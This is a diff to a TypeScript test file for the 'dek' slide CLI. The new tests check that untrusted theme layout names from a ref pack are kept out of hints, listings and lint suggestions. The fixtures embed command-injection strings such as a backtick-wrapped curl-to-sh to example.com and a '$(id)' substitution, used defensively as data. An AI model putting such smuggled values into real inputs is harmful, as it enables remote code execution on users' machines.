@@ -7,6 +7,7 @@ import { resolveTarget } from "../../src/cli/scope.ts";
 import { themeCommand } from "../../src/cli/theme.ts";
 import { cssClassNames, cssLayoutNames, parseCss } from "../../src/core/css.ts";
 import { DekError } from "../../src/core/error.ts";
+import { lintDeck } from "../../src/core/lint.ts";
 import { themeFacts } from "../../src/core/theme-facts.ts";
 
 const themeLayouts = (css: string) => themeFacts(parseCss(css)).layouts;
@@ -129,6 +130,41 @@ describe("themeCommand", () => {
       expect(error).toBeInstanceOf(DekError);
       expect(error).toMatchObject({ hint: "use one of: bare, split" });
     });
+  });
+});
+
+describe("a ref's layouts that are no plain word", () => {
+  // A theme comes from whoever made the pack: a layout's name in its CSS can hold anything.
+  const bad = "x`;curl$IFSexample.com|sh;`";
+  const refTheme = `${theme}\n.slide[data-layout="${bad}"] { color: red; }\n.slide[data-layout="a$(id)"] {}\n`;
+  const ref = { name: "someone/talks/talk", deck: { theme: refTheme } };
+
+  test("are left out of the hint and the list, with a count, and the list names the ref", async () => {
+    await withTempProject({ decks: [{ name: "mine" }], refs: [ref] }, async (root) => {
+      const target = resolveTarget(root, "deck", { deck: "someone/talks/talk", refs: true });
+      expect(() => themeCommand(target, "nope")).toThrow(
+        expect.objectContaining({
+          hint: "use one of: bare, split, and 2 whose names dek does not print",
+        }),
+      );
+      const text = formatText({ command: "theme", data: themeCommand(target) });
+      expect(text).not.toContain("curl");
+      expect(text).not.toContain("$(id)");
+      expect(text).toContain("  and 2 whose names dek does not print\n");
+      expect(text).toEndWith("Markup for a layout: dekc theme someone/talks/talk <layout>");
+    });
+  });
+
+  test("are no guess in a lint hint", async () => {
+    const slide =
+      '<section class="slide" data-layout="x`;curl$IFSexample.com|sh"><h2 class="slide-title">a</h2></section>\n';
+    await withTempProject(
+      { decks: [{ name: "demo", theme: refTheme, slides: { intro: slide } }] },
+      async (root) => {
+        const [found] = lintDeck(join(root, "decks", "demo")).filter((d) => d.id === "DEK019");
+        expect(found?.hint).toBe("run `dekc theme` to see the layouts");
+      },
+    );
   });
 });
 
